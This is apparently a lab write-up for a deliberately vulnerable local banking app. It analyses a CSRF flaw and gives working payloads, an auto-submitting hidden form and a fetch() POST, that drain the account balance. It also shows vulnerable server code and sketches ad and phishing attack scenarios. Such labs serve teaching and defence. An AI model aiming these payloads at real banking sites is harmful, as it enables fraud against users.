# Cross-Site Request Forgery(CSRF) Vulnerability Analysis - Cybersecurity 0x1

## Usage

### Prerequisites

- Docker installed and running
- Terminal/Command line access
- Web browser (Chrome, Firefox, Safari, or Edge)

### Setup Instructions

1. **Start the Vulnerable Application**

   ```bash
   (cd ex00/cyber0x0.1.01/; ./start.sh)
   ```

   Expected output:

   ```bash
   Cleaning Docker...
   Creation of the website.
   [+] Building 0.6s (9/9) FINISHED
   [...]
   You can connect on this website:
   http://localhost:8080/
   ```

2. **Access the Application**
   - Open your web browser
   - Navigate to: `http://localhost:8080/`
   - You should see the vulnerable banking application with $1000 balance

### Testing the Payloads

#### Method 1: Simple Form Attack

1. Create attack.html with:

   ```html
   <form action="http://localhost:8080/transfer" method="POST">
      <input type="hidden" name="amount" value="1000">
   </form>
   <script>document.forms[0].submit();</script>
   ```

2. Open `attack.html` in browser while logged into the application
3. Expected result: Balance reduced to $0

#### Method 2: AJAX-based Attack

1. Create ajax-attack.html with:

   ```html
   <script>
      fetch('http://localhost:8080/transfer', {
         method: 'POST',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: 'amount=1000'
      });
   </script>
   ```

2. Open while authenticated to application
3. Expected result: Silent balance transfer

### Stopping the Application

```bash
# To stop the Docker container
docker kill cyber0x1101-app-1
```

### Troubleshooting

- **Port 8000 already in use**: Stop other services using port 8000
- Transfer not working: Ensure you're logged into the application in the same browser
- CORS errors: Use the form-based methods instead of AJAX
- Balance not updating: Refresh the banking application page

## Executive Summary

This document analyzes a Cross-Site Request Forgery (CSRF) vulnerability in a banking web application running at `http://localhost:8080/`. The vulnerability allows attackers to force authenticated users to execute unwanted financial transactions.

## Vulnerability Classification

### OWASP Classification

- OWASP Top 10: A01:2021 - Broken Access Control
- CWE Classification: CWE-352 - Cross-Site Request Forgery
- Vulnerability Type: State-changing CSRF
- Severity: High (CVSS 3.1 Base Score: 8.0)

## Technical Description

### What is Cross-Site Request Forgery (CSRF)?

CSRF is an attack that forces authenticated users to submit unintended requests to a web application. Attackers exploit the trust that a site has in a user's browser by:

- Tricking users into loading malicious pages while authenticated
- Forging requests that appear legitimate to the server
- Executing state-changing operations (transfers, password changes)
- Bypassing same-origin policy through browser cookie handling

### Banking Application Specifics

This vulnerability exists because:

1. The transfer endpoint accepts POST requests without CSRF tokens
2. Session is maintained solely via cookies
3. No origin/referer header validation
4. No secondary authentication for sensitive actions

## Vulnerability Analysis

### Code Review Findings

The vulnerable application contains two critical security flaws:

1. **Missing CSRF Protection**:

   ```javascript
   app.post('/transfer', (req, res) => {
      // No CSRF token validation
      balance -= req.body.amount;
   });
   ```

2. **Cookie Configuration Issues**:

- Session cookies lack SameSite attribute
- No Secure or HttpOnly flags

3. **No Origin Verification**:

- Accepts requests from any origin
- No referer header checking

### Attack Surface

- Entry Point: Any HTML form/request to `/transfer`
- Execution Context: Authenticated user session
- User Interaction Required: Can be fully automatic
- Persistence: Non-persistent (requires active session)

## Impact Assessment

### Immediate Risks

- Unauthorized Transfers: Full account drainage possible
- Financial Fraud: Forged transactions
- Data Integrity: Balance manipulation
- Privilege Escalation: Combined with other vulnerabilities

### Business Impact

- Financial Losses: Direct monetary theft
- Reputation Damage: Loss of customer trust
- Regulatory Fines: Potential PCI DSS violations
- Operational Costs: Fraud investigation overhead

## Real-World Attack Scenarios

### Scenario 1: Malicious Advertisement

1. Attacker purchases ad space on legitimate site
2. Embeds CSRF exploit in ad iframe
3. When banking customers view the ad:
   - Transfer executes automatically
   - Funds routed to attacker's account
   - No visible indication to user

### Scenario 2: Phishing Email Campaign

1. Victims receive "Account Verification" email
2. Contains hidden image tag with CSRF payload
3. When email loads in preview pane:
   - Silent transfer occurs
   - No clicks required

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
- [OWASP Top 10 2021 - A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)
